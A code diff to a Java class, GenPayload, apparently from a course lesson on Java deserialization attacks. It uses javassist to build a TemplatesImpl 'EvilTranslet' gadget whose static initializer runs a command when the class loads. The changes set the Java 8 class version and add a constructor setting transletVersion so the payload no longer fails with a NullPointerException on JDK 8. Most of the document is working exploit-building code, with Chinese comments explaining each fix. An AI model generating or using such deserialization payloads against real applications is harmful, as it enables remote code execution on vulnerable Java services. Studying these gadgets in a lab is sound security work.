@@ -2,7 +2,9 @@ package class12;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import javassist.*;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtNewConstructor;
 import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
@@ -20,6 +22,10 @@ public class GenPayload {
         ctClass.setSuperclass(pool.get(
             "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
 
+        // 设置类文件版本为 Java 8 (52.0)，否则 JDK 8 无法加载
+        ctClass.getClassFile().setMajorVersion(52);
+        ctClass.getClassFile().setMinorVersion(0);
+
         // 静态代码块：类加载时执行命令
         ctClass.makeClassInitializer().setBody(
             "try {" +
@@ -29,10 +35,11 @@ public class GenPayload {
             "}"
         );
 
-        // 重写 postInitialization() 为空方法，防止父类构造函数中空指针
-        CtMethod m = CtNewMethod.make(
-            "protected void postInitialization() {};", ctClass);
-        ctClass.addMethod(m);
+        // 添加构造函数：设置 transletVersion = 101
+        // 避免 JDK 8 AbstractTranslet.postInitialization() 中访问 null namesArray 导致 NPE
+        ctClass.addConstructor(
+            CtNewConstructor.make(
+                "public EvilTranslet() { this.transletVersion = 101; }", ctClass));
 
         byte[] evilBytes = ctClass.toBytecode();
 
